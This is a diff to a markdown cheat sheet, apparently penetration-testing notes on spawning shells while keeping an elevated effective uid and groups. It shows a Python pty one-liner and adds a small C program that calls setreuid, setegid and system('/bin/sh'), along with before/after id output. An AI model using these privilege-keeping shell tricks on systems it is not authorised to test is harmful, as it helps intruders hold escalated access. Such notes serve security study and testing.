@@ -25,6 +25,19 @@ Spawning shells and maintaining euid and groups
 ```shell
 python -c 'import os,pty; os.setresuid(new_id,new_id,new_id); pty.spawn("/bin/bash")'
 ```
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+int main() {
+    setreuid(1001,1001);
+    setegid(1001);
+    system("/bin/sh");
+    return 0;
+}
+```
 - Without:
     - Pre: &nbsp; `uid=1000(<u1>) gid=1000(<g1>) euid=1001(<u2>) groups=1001(<g2>),1000(<g1>)`
     - Post: `uid=1000(<u1>) gid=1000(<g1>)                 groups=1000(<g1>)`
